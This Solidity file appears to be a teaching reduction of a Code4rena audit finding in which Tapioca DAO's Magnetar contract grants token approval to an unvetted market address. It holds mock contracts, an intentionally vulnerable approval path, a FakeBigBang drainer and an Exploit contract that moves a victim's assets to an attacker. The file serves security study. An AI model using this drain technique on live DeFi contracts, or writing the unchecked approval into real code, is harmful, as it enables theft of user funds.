// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-47] User's assets can be stolen when removing them from
    the Singularity market through the Magnetar contract
    (0xStalin, Code4rena 2023-07-tapioca, finding #27537)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: Magnetar's remove-asset-then-repay path receives the user's
    Singularity assets into Magnetar, grants YieldBox approval to the provided
    BigBang address, then calls BigBang.repay() — WITHOUT whitelisting either
    market. An attacker supplies a FakeBigBang that, once approved, drains
    Magnetar's YieldBox balance to the attacker.

    The approval + repay call order is preserved (@> VULN). YieldBox and SGL
    are minimal mocks; FakeBigBang mirrors the finding's PoC.
//////////////////////////////////////////////////////////////////////////*/

contract MockYieldBox {
    mapping(uint256 => mapping(address => uint256)) public balanceOf; // assetId => owner => shares
    mapping(uint256 => mapping(address => mapping(address => uint256))) public allowance; // assetId => owner => spender => amount

    function mint(uint256 assetId, address to, uint256 shares) external {
        balanceOf[assetId][to] += shares;
    }

    function setApprovalForAll(address spender, uint256 assetId, uint256 amount) external {
        allowance[assetId][msg.sender][spender] = amount;
    }

    function transfer(address from, address to, uint256 assetId, uint256 shares) external {
        if (from != msg.sender) {
            uint256 a = allowance[assetId][from][msg.sender];
            require(a >= shares, "YB: not approved");
            if (a != type(uint256).max) allowance[assetId][from][msg.sender] = a - shares;
        }
        balanceOf[assetId][from] -= shares;
        balanceOf[assetId][to] += shares;
    }
}

/// @dev Minimal Singularity: removeAsset pulls user's assets out to `to`.
contract Singularity {
    MockYieldBox public yieldBox;
    uint256 public assetId;
    mapping(address => uint256) public balanceOf; // user's SGL share

    constructor(MockYieldBox yb, uint256 id) {
        yieldBox = yb;
        assetId = id;
    }

    function seed(address user, uint256 shares) external {
        balanceOf[user] = shares;
        yieldBox.mint(assetId, address(this), shares);
    }

    function removeAsset(address from, address to, uint256 share) external returns (uint256) {
        balanceOf[from] -= share;
        yieldBox.transfer(address(this), to, assetId, share);
        return share;
    }
}

/// @notice Reduced Magnetar remove-then-repay path: no whitelist on bigBang.
contract Magnetar {
    MockYieldBox public yieldBox;

    constructor(MockYieldBox yb) {
        yieldBox = yb;
    }

    /// @dev Mirrors MagnetarMarketModule remove-assets-from-SGL then repay-on-BB.
    ///      Victim has pre-approved Magnetar to act; bigBang is unchecked.
    function exitPositionAndRemoveCollateral(
        Singularity singularity,
        address bigBang,
        address user,
        uint256 removeShare,
        uint256 repayPart
    ) external {
        // 1. Remove assets from Singularity → received by Magnetar
        singularity.removeAsset(user, address(this), removeShare);

        // 2. Grant YieldBox allowance to the provided BigBang
        // FIX: require(cluster.isWhitelisted(0, bigBang));
        yieldBox.setApprovalForAll(bigBang, singularity.assetId(), type(uint256).max); // @> VULN: bigBang never whitelisted

        // 3. Call BigBang.repay — FakeBigBang drains Magnetar's YB balance
        IBigBang(bigBang).repay(user, user, false, repayPart);
    }
}

interface IBigBang {
    function repay(address from, address to, bool skim, uint256 part) external returns (uint256 amount);
}

/// @notice Finding's FakeBigBang: once approved, transfer Magnetar's assets to self.
contract FakeBigBang {
    MockYieldBox public yieldBox;
    uint256 public assetId;
    address public magnetarContract;
    address public lootReceiver;

    function configure(MockYieldBox yb, uint256 id, address magnetar, address loot) external {
        yieldBox = yb;
        assetId = id;
        magnetarContract = magnetar;
        lootReceiver = loot;
    }

    function repay(address, address, bool, uint256) external returns (uint256 amount) {
        uint256 bal = yieldBox.balanceOf(assetId, magnetarContract);
        yieldBox.transfer(magnetarContract, lootReceiver, assetId, bal);
        amount = type(uint256).max;
    }
}

contract Exploit {
    MockYieldBox public yieldBox; // 1
    Singularity public sgl; // 2
    Magnetar public magnetar; // 3
    FakeBigBang public fakeBB; // 4

    address public constant VICTIM = address(0x5151);
    address public constant ATTACKER = address(0xA11CE);
    uint256 public constant ASSET_ID = 1;
    uint256 public constant VICTIM_SHARES = 1000 ether;

    constructor() {
        yieldBox = new MockYieldBox(); // 1
        sgl = new Singularity(yieldBox, ASSET_ID); // 2
        magnetar = new Magnetar(yieldBox); // 3
        fakeBB = new FakeBigBang(); // 4

        sgl.seed(VICTIM, VICTIM_SHARES);
        fakeBB.configure(yieldBox, ASSET_ID, address(magnetar), ATTACKER);
    }

    function run() external {
        require(yieldBox.balanceOf(ASSET_ID, ATTACKER) == 0, "attacker empty");
        require(sgl.balanceOf(VICTIM) == VICTIM_SHARES, "victim funded");

        // Attacker drives Magnetar with FakeBigBang as the "repay" market.
        // (In reality Magnetar is approved by the victim; reduced path skips that check.)
        magnetar.exitPositionAndRemoveCollateral(
            sgl,
            address(fakeBB),
            VICTIM,
            VICTIM_SHARES,
            1
        );

        // HARM: victim's Singularity assets are now with the attacker.
        require(sgl.balanceOf(VICTIM) == 0, "victim SGL drained");
        require(yieldBox.balanceOf(ASSET_ID, ATTACKER) == VICTIM_SHARES, "attacker stole assets");
        require(yieldBox.balanceOf(ASSET_ID, address(magnetar)) == 0, "magnetar empty");
    }
}
